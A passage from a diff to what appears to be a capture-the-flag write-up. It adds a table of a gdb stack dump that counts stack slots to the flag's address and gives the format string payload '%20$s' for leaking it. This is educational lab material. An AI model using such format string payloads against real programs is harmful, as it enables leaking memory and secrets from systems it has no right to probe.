@@ -133,6 +133,42 @@ Breakpoint 1, 0x080492ec in vuln() ()
 0xffffd040:     0xf7ffda40      0xf7fd6f20      0x08048369      0xf7ffda40
 0xffffd050:     0xffffd090      0xf7ffdc0c      0xf7fbe7c0      0x00000001
 ```
+OR can look like this:
+```
++------------+------------------+
+| Address    | Value            |
++------------+------------------+
+| 0xffffd000 | 0xffffd010       | --> esp (story variable)
+| 0xffffd004 | 0xffffd010       |  1
+| 0xffffd008 | 0xf7d86374       |  2
+| 0xffffd00c | 0x0804928e       |  3
++------------+------------------+
+| 0xffffd010 | 0xf7fb0061       |  4
+| 0xffffd014 | 0xffffffff       |  5
+| 0xffffd018 | 0xffffd094       |  6
+| 0xffffd01c | 0xf7d81e54       |  7
++------------+------------------+
+| 0xffffd020 | 0xf7fbe4a0       |  8
+| 0xffffd024 | 0xf7fd0294       |  9
+| 0xffffd028 | 0xf7d79674       |  10
+| 0xffffd02c | 0xf7f9a000       |  11
++------------+------------------+  
+| 0xffffd030 | 0xf7f9ada0       |  12
+| 0xffffd034 | 0x00000000       |  13
+| 0xffffd038 | 0x08048369       |  14
+| 0xffffd03c | 0x0804c034       |  15
++------------+------------------+
+| 0xffffd040 | 0xf7ffda40       |  16
+| 0xffffd044 | 0xf7fd6f20       |  17
+| 0xffffd048 | 0x08048369       |  18
+| 0xffffd04c | 0xf7ffda40       |  19
++------------+------------------+
+| 0xffffd050 | 0xffffd090       |  20 --> Address of the flag
+| 0xffffd054 | 0xf7ffdc0c       |
+| 0xffffd058 | 0xf7fbe7c0       |
+| 0xffffd05c | 0x00000001       |
++------------+------------------+
+```
 - From the current the stack frame that esp point to (0xffffd010) the stack frame of FLAG (0xffffd090) need 20 stack frame including the FLAG stackframe. So we can use this payload to leak the FLAG: "%20$s"
 ```c
 % : This marks the beginning of a format specifier.
